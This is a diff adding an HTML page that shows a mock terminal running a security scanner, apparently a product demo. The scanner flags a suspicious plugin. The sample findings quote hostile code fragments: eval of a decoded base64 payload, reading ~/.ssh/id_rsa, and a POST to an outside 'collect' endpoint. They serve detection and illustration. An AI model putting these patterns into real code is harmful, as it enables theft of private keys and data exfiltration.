@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vexscan Terminal</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: transparent;
+      padding: 20px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    .terminal {
+      background: #1a1b26;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+      max-width: 720px;
+      margin: 0 auto;
+    }
+
+    .terminal-header {
+      background: #24283b;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .terminal-button {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+
+    .terminal-button.red { background: #f7768e; }
+    .terminal-button.yellow { background: #e0af68; }
+    .terminal-button.green { background: #9ece6a; }
+
+    .terminal-title {
+      flex: 1;
+      text-align: center;
+      color: #565f89;
+      font-size: 13px;
+      margin-right: 52px;
+    }
+
+    .terminal-content {
+      padding: 20px;
+      font-family: 'SF Mono', 'Fira Code', 'JetBrains Mono', Consolas, monospace;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #a9b1d6;
+    }
+
+    .prompt {
+      color: #7aa2f7;
+    }
+
+    .command {
+      color: #c0caf5;
+    }
+
+    .dim {
+      color: #565f89;
+    }
+
+    .green {
+      color: #9ece6a;
+    }
+
+    .yellow {
+      color: #e0af68;
+    }
+
+    .red {
+      color: #f7768e;
+    }
+
+    .cyan {
+      color: #7dcfff;
+    }
+
+    .magenta {
+      color: #bb9af7;
+    }
+
+    .blue {
+      color: #7aa2f7;
+    }
+
+    .bold {
+      font-weight: 600;
+    }
+
+    .divider {
+      color: #565f89;
+    }
+
+    .mb-1 { margin-bottom: 8px; }
+    .mb-2 { margin-bottom: 16px; }
+    .mt-1 { margin-top: 8px; }
+    .mt-2 { margin-top: 16px; }
+
+    .indent {
+      padding-left: 16px;
+    }
+
+    .finding {
+      border-left: 3px solid;
+      padding-left: 12px;
+      margin: 12px 0;
+    }
+
+    .finding.critical { border-color: #f7768e; }
+    .finding.high { border-color: #ff9e64; }
+    .finding.medium { border-color: #e0af68; }
+  </style>
+</head>
+<body>
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-button red"></div>
+      <div class="terminal-button yellow"></div>
+      <div class="terminal-button green"></div>
+      <div class="terminal-title">vexscan — zsh</div>
+    </div>
+    <div class="terminal-content">
+      <div class="mb-2">
+        <span class="prompt">❯</span> <span class="command">vexscan vet https://github.com/user/suspicious-plugin</span>
+      </div>
+
+      <div class="dim mb-1">Cloning repository...</div>
+      <div class="dim mb-2">Scanning 12 files...</div>
+
+      <div class="divider">═══════════════════════════════════════════════════════════════</div>
+      <div class="cyan bold">🔒  Vexscan Security Scan Report</div>
+      <div class="divider mb-2">═══════════════════════════════════════════════════════════════</div>
+
+      <div class="mb-2">
+        <div class="bold">Summary</div>
+        <div class="indent dim">Files scanned: <span class="cyan">12</span></div>
+        <div class="indent dim">Total findings: <span class="yellow">4</span></div>
+        <div class="indent dim">Scan time: <span class="cyan">127ms</span></div>
+      </div>
+
+      <div class="mb-2">
+        <div class="bold">Findings by Severity</div>
+        <div class="indent"><span class="red">● Critical: 1</span></div>
+        <div class="indent"><span style="color: #ff9e64;">● High:     2</span></div>
+        <div class="indent"><span class="yellow">● Medium:   1</span></div>
+        <div class="indent dim">● Low:      0</div>
+      </div>
+
+      <div class="divider mt-2">───────────────────────────────────────────────────────────────</div>
+
+      <div class="finding critical">
+        <div><span class="red bold">[CRITICAL]</span> <span class="bold">EXEC-001: Dynamic code execution</span></div>
+        <div class="dim">src/index.js:23</div>
+        <div class="mt-1"><span class="dim">│</span> <span class="magenta">eval</span>(<span class="green">decodedPayload</span>);</div>
+        <div class="mt-1 dim">Executing dynamically generated code can lead to arbitrary code execution</div>
+      </div>
+
+      <div class="finding high">
+        <div><span style="color: #ff9e64;" class="bold">[HIGH]</span> <span class="bold">CRED-003: SSH key access</span></div>
+        <div class="dim">src/utils.js:45</div>
+        <div class="mt-1"><span class="dim">│</span> fs.<span class="magenta">readFileSync</span>(<span class="green">'~/.ssh/id_rsa'</span>)</div>
+        <div class="mt-1 dim">Attempting to read SSH private keys</div>
+      </div>
+
+      <div class="finding high">
+        <div><span style="color: #ff9e64;" class="bold">[HIGH]</span> <span class="bold">EXFIL-001: Data exfiltration</span></div>
+        <div class="dim">src/index.js:67</div>
+        <div class="mt-1"><span class="dim">│</span> <span class="magenta">fetch</span>(<span class="green">'https://external.com/collect'</span>, {<span class="cyan">method</span>: <span class="green">'POST'</span>})</div>
+        <div class="mt-1 dim">Sending data to external server</div>
+      </div>
+
+      <div class="finding medium">
+        <div><span class="yellow bold">[MEDIUM]</span> <span class="bold">OBF-002: Base64 encoded payload</span></div>
+        <div class="dim">src/index.js:18</div>
+        <div class="mt-1"><span class="dim">│</span> <span class="cyan">const</span> payload = <span class="magenta">atob</span>(<span class="green">"ZXZhbCgiYWxlcnQoMSkiKQ=="</span>)</div>
+        <div class="mt-1 dim">Decoded: <span class="red">eval("alert(1)")</span></div>
+      </div>
+
+      <div class="divider mt-2">═══════════════════════════════════════════════════════════════</div>
+      <div class="red bold mt-1">VERDICT: ❌ BLOCKED — 1 critical, 2 high severity issues found</div>
+      <div class="divider">═══════════════════════════════════════════════════════════════</div>
+    </div>
+  </div>
+</body>
+</html>
